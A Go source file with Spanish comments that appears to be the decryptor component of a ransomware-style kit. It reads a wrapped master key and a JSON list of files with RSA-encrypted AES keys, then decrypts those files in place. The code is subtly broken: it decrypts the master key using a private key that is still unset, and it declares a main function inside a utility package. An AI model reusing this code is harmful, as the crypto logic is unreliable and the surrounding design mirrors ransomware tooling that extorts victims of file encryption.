package util

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
)

type EncryptionInfo struct {
	Path string `json:"path"`
	Key  []byte `json:"key"`
}

type EncryptionInfos []EncryptionInfo

var privateKey *rsa.PrivateKey
var eis EncryptionInfos

func loadPrivateKey() {
	// Leer la clave privada cifrada de master.key
	encryptedPrivateKey, err := os.ReadFile("master.key")
	if err != nil {
		log.Fatal("Error al leer master.key:", err)
	}

	// Desencriptar la clave privada con la clave privada del servidor
	privateKeyBytes, err := decryptRSA(encryptedPrivateKey)
	if err != nil {
		log.Fatal("Error al desencriptar master.key:", err)
	}

	// Parsear la clave privada del cliente
	privateKey, err = x509.ParsePKCS1PrivateKey(privateKeyBytes)
	if err != nil {
		log.Fatal("Error al parsear la clave privada:", err)
	}
}

func decryptRSA(encryptedData []byte) ([]byte, error) {
	decrypted, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, encryptedData, nil)
	if err != nil {
		return nil, err
	}
	return decrypted, nil
}

func decryptAES(encryptedData, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()
	if len(encryptedData) < blockSize {
		return nil, fmt.Errorf("El tamaño del cifrado es menor que el tamaño del bloque")
	}

	iv := encryptedData[:blockSize]
	encryptedData = encryptedData[blockSize:]

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(encryptedData, encryptedData)

	return unpad(encryptedData)
}

func unpad(data []byte) ([]byte, error) {
	length := len(data)
	padding := int(data[length-1])

	if padding > length {
		return nil, fmt.Errorf("Padding inválido")
	}

	return data[:length-padding], nil
}

func main() {
	// Verificar que se pase un argumento con la ruta
	if len(os.Args) < 2 {
		fmt.Println("Uso: go run decryptor.go <ruta>")
		os.Exit(1)
	}
	ruta := os.Args[1] // Obtener la ruta pasada como argumento

	// Cargar la clave privada antes de desencriptar archivos
	loadPrivateKey()

	// Leer el archivo file.keys con la información de los archivos cifrados
	keysData, err := os.ReadFile("file.keys")
	if err != nil {
		log.Fatal("Error al leer file.keys:", err)
	}

	err = json.Unmarshal(keysData, &eis)
	if err != nil {
		log.Fatal("Error al parsear file.keys:", err)
	}

	// Desencriptar solo archivos dentro de la ruta dada
	for _, info := range eis {
		// Asegurar que el archivo pertenece al directorio especificado
		if !filepath.HasPrefix(info.Path, ruta) {
			continue
		}

		fmt.Println("Desencriptando:", info.Path)

		// Leer el archivo cifrado
		encryptedData, err := os.ReadFile(info.Path)
		if err != nil {
			log.Println("Error al leer archivo cifrado:", err)
			continue
		}

		// Desencriptar la clave AES con la clave privada RSA
		aesKey, err := decryptRSA(info.Key)
		if err != nil {
			log.Println("Error al desencriptar la clave AES:", err)
			continue
		}

		// Desencriptar el contenido del archivo
		decryptedData, err := decryptAES(encryptedData, aesKey)
		if err != nil {
			log.Println("Error al desencriptar el archivo:", err)
			continue
		}

		// Guardar el archivo desencriptado
		err = os.WriteFile(info.Path, decryptedData, 0666)
		if err != nil {
			log.Println("Error al escribir el archivo desencriptado:", err)
		} else {
			fmt.Println("Archivo desencriptado:", info.Path)
		}
	}
}
